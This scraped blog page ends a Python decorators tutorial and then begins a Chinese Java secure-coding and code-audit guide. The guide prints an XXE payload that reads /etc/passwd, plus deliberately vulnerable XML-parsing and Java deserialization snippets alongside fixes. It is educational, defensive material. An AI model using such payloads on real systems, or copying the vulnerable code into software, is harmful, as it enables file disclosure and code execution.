<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#x590D;&#x5236;&#x4EE3;&#x7801;def hotties_lookup_logged(search_criteria):</span><br><span class="line">    print(&quot;Request was made:&quot;, search_criteria)</span><br><span class="line">    search_results = hottie_lookup_timed(search_criteria) </span><br><span class="line">    print(&quot;Matching entries found:&quot;, search_results)</span><br><span class="line">    return search_results</span><br></pre></td></tr></table></figure>

<p>Awesome! Now <code>hottie_lookup()</code> is back to its original implementation and free of extra work.</p>
<p>All we need to do now is search/replace all calls to <code>hottie_lookup()</code> with <code>hotties_lookup_logged()</code>, so that every time the service is executed the wrapper function is called instead. Sure, but if we want to add an extra<br> wrapper? Then we would need to rename all function calls again :/. Sure we can do better.</p>
<h1 id="Functions-Are-First-Class-Citizens"><a href="#Functions-Are-First-Class-Citizens" class="headerlink" title="Functions Are First Class Citizens"></a>Functions Are First Class Citizens</h1><p>By enclosing our lookup functions inside a wrapper, we were able to perform timing and logging by leaving the original implementations unchanged. This is a step in the right direction, but there are still some issues to solve.</p>
<p>First off all, we completely forgot about the gardener search, that function needs to be decorated as well! Sure we can repeat the same trick, but we would end up having two functions, <code>gardener_lookup_timed()</code> and a <code>gardener_lookup_logged()</code> that would be practically the same their hottie search versions. What if we want to log the time in milliseconds instead of seconds? We would need to change two implementations.</p>
<p>What do we do in this cases? We generalize! Python is a very democratic language, where functions have the same rights as any other value, so why not just write a single timer wrapper function that receives the function to be timed as parameter?</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&#x590D;&#x5236;&#x4EE3;&#x7801;import time</span><br><span class="line"></span><br><span class="line">def timer(func):</span><br><span class="line">    def inner_func(search_criteria):</span><br><span class="line">        current_time = time.time()</span><br><span class="line">        result = func(search_criteria)</span><br><span class="line">        print(&quot;Request took {:.1f}s&quot;.format(time.time()-current_time))</span><br><span class="line">        return result</span><br><span class="line">    return inner_func</span><br></pre></td></tr></table></figure>

<p>Wow wow slow down, what happened here? Yes, it looks complex, but it really isn&#x2019;t that complicated once we have dissected it.</p>
<p>Decorators take advantage of how functions are implemented in python. Have you ever heard of classes and objects? well in python functions are just that, objects. This means that functions can be passed as arguments to another functions and returned<br> as any other value. Once you have understood this the snippet above becomes much more digestible.</p>
<p>A decorator is a function that receives a function and returns a function. Think about it this way: we are <strong>decorating</strong>, we are supposed to receive something, add some extra stuff to it and return the same thing we received. But,<br> what exactly is returned? The wrapper function from last section! All decorators do is create a wrapper function and return it.</p>
<p>This new &#x201C;trick&#x201D; is so awesome that we can write our <code>hottie_lookup_timed()</code> and <code>gardener_lookup_timed()</code> like this:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x590D;&#x5236;&#x4EE3;&#x7801;hottie_lookup_timed = timer(hottie_lookup)</span><br><span class="line">gardener_lookup_timed = timer(gardener_lookup)</span><br></pre></td></tr></table></figure>

<p>Do you see it? our timer decorator takes our original function, adds a timer around it, and returns it. And most importantly: timing functionality exists in a single place and can be used to time <em>any</em> function we want. Do we have to log<br> time in milliseconds? Sure, a single modification to our timer decorator will do.</p>
<p>Let&#x2019;s make a test with our new <code>hotties_lookup_timed()</code> function with some very popular search criteria:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#x590D;&#x5236;&#x4EE3;&#x7801;&gt;&gt;&gt; hotties_lookup_timed([&apos;latino&apos;, &apos;computer scientist&apos;])</span><br><span class="line">Querying hotties database...</span><br><span class="line">Request took 2.0 seconds</span><br></pre></td></tr></table></figure>

<p>Perfect! Our function is timed and the decorator seems to be working.</p>
<p>Naturally the same technique can be applied to construct a single logging decorator.</p>
<h2 id="Generalizing-with-args-and-kwargs"><a href="#Generalizing-with-args-and-kwargs" class="headerlink" title="Generalizing with \args* and \*kwargs*"></a>Generalizing with <em>\</em>args* and <em>\</em>*kwargs*</h2><p>The timer decorator we wrote works, but only if we are decorating a function that receives a single argument. What if in the future we need to decorate a function that receives no arguments? That wouldn&#x2019;t work with the current implementation,<br> as our inner function declares one argument.</p>
<p>The problem here is that we are making assumptions on the function to be decorated.</p>
<p>For this reason, in case your decorators don&#x2019;t need to know anything about the decorated function, it is standard practice to define our inner function with variable arguments and propagate them to the input function:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&#x590D;&#x5236;&#x4EE3;&#x7801;import time</span><br><span class="line">def timer(func):</span><br><span class="line">    def inner_func(*args, **kwargs):</span><br><span class="line">        current_time = time.time()</span><br><span class="line">        result = func(*args, **kwargs)</span><br><span class="line">        print(&quot;Request took {:.1f}s&quot;.format(time.time()-current_time))</span><br><span class="line">        return result</span><br><span class="line">    return inner_func</span><br></pre></td></tr></table></figure>

<p>Don&#x2019;t let python&#x2019;s <em>\</em>args* and <em>\</em>*kwargs* scare you away. All we did was define a function that can receive an arbitrary number of arguments, both keyworded and non-keyworded. For example, you can do this: <code>inner_func(8)</code>,<br> or this: <code>inner_func(city=&apos;Munich&apos;, state=&apos;Bavaria&apos;)</code>. You then propagate all your arguments to <code>func</code>, that&#x2019;s it.</p>
<p>By using <em>\</em>args* and <em>\</em>*kwargs*, our decorators can decorate arbitrary functions as we no longer need to know beforehand the arguments they declare.</p>
<h1 id="Leaving-Callers-Unchanged"><a href="#Leaving-Callers-Unchanged" class="headerlink" title="Leaving Callers Unchanged"></a>Leaving Callers Unchanged</h1><p>We were able to decorate our <code>hotties_lookup()</code> and <code>gardeners_lookup()</code> with a shared timer decorator. But are we completely happy? not really, we still have the problem mentioned before: callers of our functions need to<br> be changed, as <code>hotties_lookup_timed()</code> needs to be called instead of <code>hotties_search()</code>. But remember, functions are objects, we can just assign them to other variables, so why not just reassign the original implementations?</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x590D;&#x5236;&#x4EE3;&#x7801;hotties_lookup = timer(hotties_lookup)</span><br><span class="line">gardeners_lookup = timer(gardeners_lookup)</span><br></pre></td></tr></table></figure>

<p>We just <em>replaced</em> our original <code>hotties_lookup()</code> with its decorated version. This means that callers no longer need to be changed, since <code>hotties_lookup()</code> now points to the timed (a.k.a decorated) version:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#x590D;&#x5236;&#x4EE3;&#x7801;&gt;&gt;&gt; hotties_search([&apos;latino&apos;, &apos;computer scientist&apos;])</span><br><span class="line">Querying hotties database...</span><br><span class="line">Request took 2.0 seconds</span><br></pre></td></tr></table></figure>

<p>This idiom is so common that it has its own built-in language syntax.</p>
<p>The expression:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x590D;&#x5236;&#x4EE3;&#x7801;hotties_lookup = timer(hotties_lookup)</span><br></pre></td></tr></table></figure>

<p>is equivalent to:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#x590D;&#x5236;&#x4EE3;&#x7801;@timer</span><br><span class="line">def hotties_lookup(search_criteria):</span><br><span class="line">    pass</span><br></pre></td></tr></table></figure>

<h1 id="Putting-It-All-Together"><a href="#Putting-It-All-Together" class="headerlink" title="Putting It All Together"></a>Putting It All Together</h1><p>Now we are happy. Here the entire implementation:</p>
<p>First we write the decorators we need:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&#x590D;&#x5236;&#x4EE3;&#x7801;import time</span><br><span class="line"></span><br><span class="line">def logger(func):</span><br><span class="line">    def inner_func(search_criteria):</span><br><span class="line">        print(&quot;Request has made with criteria:&quot;, search_criteria)</span><br><span class="line">        result = func(search_criteria)</span><br><span class="line">        print(&quot;Matching entries found:&quot;, result)</span><br><span class="line">        return result</span><br><span class="line">    return inner_func</span><br><span class="line"></span><br><span class="line">def timer(func):</span><br><span class="line">    def inner_func(search_criteria):</span><br><span class="line">        current_time = time.time()</span><br><span class="line">        result = func(search_criteria)</span><br><span class="line">        print(&quot;Request took {:.1f}s&quot;.format(time.time()-current_time))</span><br><span class="line">        return result</span><br><span class="line">    return inner_func</span><br></pre></td></tr></table></figure>

<p>Then we decorate our functions:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&#x590D;&#x5236;&#x4EE3;&#x7801;@logger</span><br><span class="line">@timer</span><br><span class="line">def hottie_lookup(search_criteria):</span><br><span class="line">    print(&apos;Querying hotties database...&apos;)</span><br><span class="line">    search_results = []</span><br><span class="line">    #Simulate patended algorithm to find hottes singles in your area</span><br><span class="line">    time.sleep(2) </span><br><span class="line">    return search_results</span><br><span class="line"></span><br><span class="line">@logger</span><br><span class="line">@timer</span><br><span class="line">def gardener_lookup(search_criteria):</span><br><span class="line">    print(&apos;Querying gardeners database...&apos;)</span><br><span class="line">    search_results = []</span><br><span class="line">    #Simulate patended algorithm to find skilful gardeners in town</span><br><span class="line">    time.sleep(2) </span><br><span class="line">    return search_results</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&#x590D;&#x5236;&#x4EE3;&#x7801;&gt;&gt;&gt; hotties_lookup([&apos;latino&apos;, &apos;computer scientist&apos;])</span><br><span class="line">Request has made with criteria: [&apos;latino&apos;, &apos;computer scientist&apos;]</span><br><span class="line">Querying hotties database...</span><br><span class="line">Request took 2.0s</span><br><span class="line">Matching entries found: []</span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt; gardeners_lookup([&apos;bush sculpture&apos;, &apos;semilegal botany&apos;])</span><br><span class="line">Request has made with criteria: [&apos;bush sculpture&apos;, &apos;semilegal botany&apos;]</span><br><span class="line">Querying gardeners database...</span><br><span class="line">Request took 2.0s</span><br><span class="line">Matching entries found: []</span><br></pre></td></tr></table></figure>

<p>Voila. That&#x2019;s it. We have covered the basics of python decorators and hopefully you are now convinced of how simple and useful they are. This is not the end of it, though, there is more stuff you can do with decorators. Most importantly, you can<br> add extra generalization to your decorators by passing arguments to them:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#x590D;&#x5236;&#x4EE3;&#x7801;@time(&apos;seconds&apos;)</span><br><span class="line">def hottie_lookup(search_criteria):</span><br><span class="line">    pass</span><br><span class="line"></span><br><span class="line">@time(&apos;milliseconds&apos;)</span><br><span class="line">def gardener_lookup(search_criteria):</span><br><span class="line">    pass</span><br></pre></td></tr></table></figure>

<p>Here, for instance, we wrote a generic timer decorator that receives the time unit to measure as argument. This lets us time the hottie lookup in seconds and the gardener lookup in milliseconds, all by using a single decorator. Decorators with<br> arguments are out of the scope of this post, but if you are curious and have liked this post, leave me a comment and maybe I&#x2019;ll write a follow up post.</p>
<h1 id="Wrapping-Up"><a href="#Wrapping-Up" class="headerlink" title="Wrapping Up"></a>Wrapping Up</h1><ul>
<li><p>Decorators receive a function and returned a wrapped version of it</p>
</li>
<li><p>Decorated functions or methods don&#x2019;t change: decorators can only append or prepend functionality</p>
</li>
<li><p>Decoration is transparent to callers: original function calls are replaced by decorated versions</p>
</li>
<li><p>Decorators avoid code duplication: decorating functionality resides in a single place</p>
</li>
<li><p>Decorators are reusable: decorate several functions with single decorator</p>
</li>
<li><p>Decorators are flexible: combine decorators as you wish, you can even decorate decorators!</p>
</li>
<li><p>Use <em>\</em>args* and <em>\</em>*kwargs* to write generic decorators that can decorate arbitrary functions</p>
<p>Written on November 29, 2017 </p>
</li>
</ul>
<p><strong>&#x672C;&#x6587;&#x8F6C;&#x8F7D;&#x81EA;:</strong> <a href="/external_links/15f4a3b74a8e096ffb558da0c0f5ab04.html" target="blank" rel="noopener">&#x6398;&#x91D1;</a></p>
<p><em><a href="https://dev.newban.cn/">&#x5F00;&#x53D1;&#x8005;&#x535A;&#x5BA2; &#x2013; &#x548C;&#x5F00;&#x53D1;&#x76F8;&#x5173;&#x7684; &#x8FD9;&#x91CC;&#x5168;&#x90FD;&#x6709;</a></em></p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://dev.newban.cn../../6844903520211042312.html">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="开发者博客">
      <meta itemprop="description" content>
      <meta itemprop="image" content="../../images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="开发者博客 – IT技术 尽在开发者博客">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="../../6844903520211042312.html" itemprop="url">JAVA安全编码与代码审计</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-12-08T15:06:39+08:00">
                2017-12-08
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h2 id="JAVA&#x5B89;&#x5168;&#x7F16;&#x7801;&#x4E0E;&#x4EE3;&#x7801;&#x5BA1;&#x8BA1;"><a href="#JAVA&#x5B89;&#x5168;&#x7F16;&#x7801;&#x4E0E;&#x4EE3;&#x7801;&#x5BA1;&#x8BA1;" class="headerlink" title="JAVA&#x5B89;&#x5168;&#x7F16;&#x7801;&#x4E0E;&#x4EE3;&#x7801;&#x5BA1;&#x8BA1;"></a>JAVA&#x5B89;&#x5168;&#x7F16;&#x7801;&#x4E0E;&#x4EE3;&#x7801;&#x5BA1;&#x8BA1;</h2><h3 id="&#x6982;&#x8FF0;"><a href="#&#x6982;&#x8FF0;" class="headerlink" title="&#x6982;&#x8FF0;"></a>&#x6982;&#x8FF0;</h3><p>&#x672C;&#x6587;&#x91CD;&#x70B9;&#x4ECB;&#x7ECD;JAVA&#x5B89;&#x5168;&#x7F16;&#x7801;&#x4E0E;&#x4EE3;&#x7801;&#x5BA1;&#x8BA1;&#x57FA;&#x7840;&#x77E5;&#x8BC6;&#xFF0C;&#x4F1A;&#x4EE5;&#x6F0F;&#x6D1E;&#x53CA;&#x5B89;&#x5168;&#x7F16;&#x7801;&#x793A;&#x4F8B;&#x7684;&#x65B9;&#x5F0F;&#x4ECB;&#x7ECD;JAVA&#x4EE3;&#x7801;&#x4E2D;&#x5E38;&#x89C1;Web&#x6F0F;&#x6D1E;&#x7684;&#x5F62;&#x6210;&#x53CA;&#x76F8;&#x5E94;&#x7684;&#x4FEE;&#x590D;&#x65B9;&#x6848;&#xFF0C;&#x540C;&#x65F6;&#x5BF9;&#x4E00;&#x4E9B;&#x5E38;&#x89C1;&#x7684;&#x6F0F;&#x6D1E;&#x51FD;&#x6570;&#x8FDB;&#x884C;&#x4F8B;&#x4E3E;&#x3002;</p>
<h3 id="XXE"><a href="#XXE" class="headerlink" title="XXE"></a>XXE</h3><h5 id="&#x4ECB;&#x7ECD;"><a href="#&#x4ECB;&#x7ECD;" class="headerlink" title="&#x4ECB;&#x7ECD;"></a>&#x4ECB;&#x7ECD;</h5><p>XML&#x6587;&#x6863;&#x7ED3;&#x6784;&#x5305;&#x62EC;XML&#x58F0;&#x660E;&#x3001;DTD&#x6587;&#x6863;&#x7C7B;&#x578B;&#x5B9A;&#x4E49;&#xFF08;&#x53EF;&#x9009;&#xFF09;&#x3001;&#x6587;&#x6863;&#x5143;&#x7D20;&#x3002;&#x6587;&#x6863;&#x7C7B;&#x578B;&#x5B9A;&#x4E49;(DTD)&#x7684;&#x4F5C;&#x7528;&#x662F;&#x5B9A;&#x4E49; XML &#x6587;&#x6863;&#x7684;&#x5408;&#x6CD5;&#x6784;&#x5EFA;&#x6A21;&#x5757;&#x3002;DTD &#x53EF;&#x4EE5;&#x5728; XML &#x6587;&#x6863;&#x5185;&#x58F0;&#x660E;&#xFF0C;&#x4E5F;&#x53EF;&#x4EE5;&#x5916;&#x90E8;&#x5F15;&#x7528;&#x3002;</p>
<ul>
<li>&#x5185;&#x90E8;&#x58F0;&#x660E;DTD:</li>
</ul>
<blockquote>
</blockquote>
<ul>
<li>&#x5F15;&#x7528;&#x5916;&#x90E8;DTD:</li>
</ul>
<blockquote>
</blockquote>
<p>&#x5F53;&#x5141;&#x8BB8;&#x5F15;&#x7528;&#x5916;&#x90E8;&#x5B9E;&#x4F53;&#x65F6;&#xFF0C;&#x6076;&#x610F;&#x653B;&#x51FB;&#x8005;&#x5373;&#x53EF;&#x6784;&#x9020;&#x6076;&#x610F;&#x5185;&#x5BB9;&#x8BBF;&#x95EE;&#x670D;&#x52A1;&#x5668;&#x8D44;&#x6E90;,&#x5982;&#x8BFB;&#x53D6;passwd&#x6587;&#x4EF6;&#xFF1A;</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#x590D;&#x5236;&#x4EE3;&#x7801;&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE replace [</span><br><span class="line">&lt;!ENTITY test SYSTEM &quot;file:///ect/passwd&quot;&gt;]&gt;</span><br><span class="line">&lt;msg&gt;&amp;test;&lt;/msg&gt;</span><br></pre></td></tr></table></figure>

<h5 id="&#x6F0F;&#x6D1E;&#x793A;&#x4F8B;"><a href="#&#x6F0F;&#x6D1E;&#x793A;&#x4F8B;" class="headerlink" title="&#x6F0F;&#x6D1E;&#x793A;&#x4F8B;"></a>&#x6F0F;&#x6D1E;&#x793A;&#x4F8B;</h5><p>&#x6B64;&#x5904;&#x4EE5;org.dom4j.io.SAXReader&#x4E3A;&#x4F8B;,&#x4EC5;&#x5C55;&#x793A;&#x90E8;&#x5206;&#x4EE3;&#x7801;&#x7247;&#x6BB5;&#xFF1A;</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&#x590D;&#x5236;&#x4EE3;&#x7801;`String xmldata = request.getParameter(&quot;data&quot;);`</span><br><span class="line">SAXReader sax=new SAXReader();//&#x521B;&#x5EFA;&#x4E00;&#x4E2A;SAXReader&#x5BF9;&#x8C61;</span><br><span class="line">Document document=sax.read(new ByteArrayInputStream(xmldata.getBytes()));//&#x83B7;&#x53D6;document&#x5BF9;&#x8C61;,&#x5982;&#x679C;&#x6587;&#x6863;&#x65E0;&#x8282;&#x70B9;&#xFF0C;&#x5219;&#x4F1A;&#x629B;&#x51FA;Exception&#x63D0;&#x524D;&#x7ED3;&#x675F;</span><br><span class="line">Element root=document.getRootElement();//&#x83B7;&#x53D6;&#x6839;&#x8282;&#x70B9;</span><br><span class="line">List rowList = root.selectNodes(&quot;//msg&quot;);</span><br><span class="line">Iterator&lt;?&gt; iter1 = rowList.iterator();</span><br><span class="line">if (iter1.hasNext()) {</span><br><span class="line">    Element beanNode = (Element) iter1.next();</span><br><span class="line">    modelMap.put(&quot;success&quot;,true);</span><br><span class="line">    modelMap.put(&quot;resp&quot;,beanNode.getTextTrim());</span><br><span class="line">}</span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<h5 id="&#x5BA1;&#x8BA1;&#x51FD;&#x6570;"><a href="#&#x5BA1;&#x8BA1;&#x51FD;&#x6570;" class="headerlink" title="&#x5BA1;&#x8BA1;&#x51FD;&#x6570;"></a>&#x5BA1;&#x8BA1;&#x51FD;&#x6570;</h5><p>XML&#x89E3;&#x6790;&#x4E00;&#x822C;&#x5728;&#x5BFC;&#x5165;&#x914D;&#x7F6E;&#x3001;&#x6570;&#x636E;&#x4F20;&#x8F93;&#x63A5;&#x53E3;&#x7B49;&#x573A;&#x666F;&#x53EF;&#x80FD;&#x4F1A;&#x7528;&#x5230;&#xFF0C;&#x6D89;&#x53CA;&#x5230;XML&#x6587;&#x4EF6;&#x5904;&#x7406;&#x7684;&#x573A;&#x666F;&#x53EF;&#x7559;&#x610F;&#x4E0B;XML&#x89E3;&#x6790;&#x5668;&#x662F;&#x5426;&#x7981;&#x7528;&#x5916;&#x90E8;&#x5B9E;&#x4F53;&#xFF0C;&#x4ECE;&#x800C;&#x5224;&#x65AD;&#x662F;&#x5426;&#x5B58;&#x5728;XXE&#x3002;&#x90E8;&#x5206;XML&#x89E3;&#x6790;&#x63A5;&#x53E3;&#x5982;&#x4E0B;&#xFF1A;</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&#x590D;&#x5236;&#x4EE3;&#x7801;`javax.xml.parsers.DocumentBuilder`</span><br><span class="line">javax.xml.stream.XMLStreamReader</span><br><span class="line">org.jdom.input.SAXBuilder</span><br><span class="line">org.jdom2.input.SAXBuilder</span><br><span class="line">javax.xml.parsers.SAXParser</span><br><span class="line">org.dom4j.io.SAXReader&#xA0;</span><br><span class="line">org.xml.sax.XMLReader</span><br><span class="line">javax.xml.transform.sax.SAXSource&#xA0;</span><br><span class="line">javax.xml.transform.TransformerFactory&#xA0;</span><br><span class="line">javax.xml.transform.sax.SAXTransformerFactory&#xA0;</span><br><span class="line">javax.xml.validation.SchemaFactory</span><br><span class="line">javax.xml.bind.Unmarshaller</span><br><span class="line">javax.xml.xpath.XPathExpression</span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<h5 id="&#x4FEE;&#x590D;&#x65B9;&#x6848;"><a href="#&#x4FEE;&#x590D;&#x65B9;&#x6848;" class="headerlink" title="&#x4FEE;&#x590D;&#x65B9;&#x6848;"></a>&#x4FEE;&#x590D;&#x65B9;&#x6848;</h5><p>&#x4F7F;&#x7528;XML&#x89E3;&#x6790;&#x5668;&#x65F6;&#x9700;&#x8981;&#x8BBE;&#x7F6E;&#x5176;&#x5C5E;&#x6027;&#xFF0C;&#x7981;&#x6B62;&#x4F7F;&#x7528;&#x5916;&#x90E8;&#x5B9E;&#x4F53;&#xFF0C;&#x4EE5;&#x4E0A;&#x4F8B;&#x4E2D;SAXReader&#x4E3A;&#x4F8B;&#xFF0C;&#x5B89;&#x5168;&#x7684;&#x4F7F;&#x7528;&#x65B9;&#x5F0F;&#x5982;&#x4E0B;:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#x590D;&#x5236;&#x4EE3;&#x7801;`sax.setFeature(&quot;http://apache.org/xml/features/disallow-doctype-decl&quot;, true);`</span><br><span class="line">sax.setFeature(&quot;http://xml.org/sax/features/external-general-entities&quot;, false);</span><br><span class="line">sax.setFeature(&quot;http://xml.org/sax/features/external-parameter-entities&quot;, false);</span><br></pre></td></tr></table></figure>

<p>&#x5176;&#x5B83;XML&#x89E3;&#x6790;&#x5668;&#x7684;&#x5B89;&#x5168;&#x4F7F;&#x7528;&#x53EF;&#x53C2;&#x8003;<a href="/external_links/2623a6dc00900e4b58ecf65092bd7b47.html" target="blank" rel="noopener">OWASP XML External Entity (XXE) Prevention Cheat Sheet</a></p>
<h3 id="&#x53CD;&#x5E8F;&#x5217;&#x5316;&#x6F0F;&#x6D1E;"><a href="#&#x53CD;&#x5E8F;&#x5217;&#x5316;&#x6F0F;&#x6D1E;" class="headerlink" title="&#x53CD;&#x5E8F;&#x5217;&#x5316;&#x6F0F;&#x6D1E;"></a>&#x53CD;&#x5E8F;&#x5217;&#x5316;&#x6F0F;&#x6D1E;</h3><h5 id="&#x4ECB;&#x7ECD;-1"><a href="#&#x4ECB;&#x7ECD;-1" class="headerlink" title="&#x4ECB;&#x7ECD;"></a>&#x4ECB;&#x7ECD;</h5><p>&#x5E8F;&#x5217;&#x5316;&#x662F;&#x8BA9; Java &#x5BF9;&#x8C61;&#x8131;&#x79BB; Java &#x8FD0;&#x884C;&#x73AF;&#x5883;&#x7684;&#x4E00;&#x79CD;&#x624B;&#x6BB5;&#xFF0C;&#x53EF;&#x4EE5;&#x6709;&#x6548;&#x7684;&#x5B9E;&#x73B0;&#x591A;&#x5E73;&#x53F0;&#x4E4B;&#x95F4;&#x7684;&#x901A;&#x4FE1;&#x3001;&#x5BF9;&#x8C61;&#x6301;&#x4E45;&#x5316;&#x5B58;&#x50A8;&#x3002;</p>
<p>Java&#x7A0B;&#x5E8F;&#x4F7F;&#x7528;ObjectInputStream&#x5BF9;&#x8C61;&#x7684;readObject&#x65B9;&#x6CD5;&#x5C06;&#x53CD;&#x5E8F;&#x5217;&#x5316;&#x6570;&#x636E;&#x8F6C;&#x6362;&#x4E3A;java&#x5BF9;&#x8C61;&#x3002;&#x4F46;&#x5F53;&#x8F93;&#x5165;&#x7684;&#x53CD;&#x5E8F;&#x5217;&#x5316;&#x7684;&#x6570;&#x636E;&#x53EF;&#x88AB;&#x7528;&#x6237;&#x63A7;&#x5236;&#xFF0C;&#x90A3;&#x4E48;&#x653B;&#x51FB;&#x8005;&#x5373;&#x53EF;&#x901A;&#x8FC7;&#x6784;&#x9020;&#x6076;&#x610F;&#x8F93;&#x5165;&#xFF0C;&#x8BA9;&#x53CD;&#x5E8F;&#x5217;&#x5316;&#x4EA7;&#x751F;&#x975E;&#x9884;&#x671F;&#x7684;&#x5BF9;&#x8C61;&#xFF0C;&#x5728;&#x6B64;&#x8FC7;&#x7A0B;&#x4E2D;&#x6267;&#x884C;&#x6784;&#x9020;&#x7684;&#x4EFB;&#x610F;&#x4EE3;&#x7801;&#x3002;</p>
<h5 id="&#x6F0F;&#x6D1E;&#x793A;&#x4F8B;-1"><a href="#&#x6F0F;&#x6D1E;&#x793A;&#x4F8B;-1" class="headerlink" title="&#x6F0F;&#x6D1E;&#x793A;&#x4F8B;"></a>&#x6F0F;&#x6D1E;&#x793A;&#x4F8B;</h5><p>&#x6F0F;&#x6D1E;&#x4EE3;&#x7801;&#x793A;&#x4F8B;&#x5982;&#x4E0B;&#xFF1A;</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#x590D;&#x5236;&#x4EE3;&#x7801;......</span><br><span class="line">//&#x8BFB;&#x53D6;&#x8F93;&#x5165;&#x6D41;,&#x5E76;&#x8F6C;&#x6362;&#x5BF9;&#x8C61;</span><br><span class="line">InputStream in=request.getInputStream();</span><br><span class="line">ObjectInputStream ois = new ObjectInputStream(in);</span><br><span class="line">//&#x6062;&#x590D;&#x5BF9;&#x8C61;</span><br><span class="line">ois.readObject();</span><br><span class="line">ois.close();</span><br></pre></td></tr></table></figure>

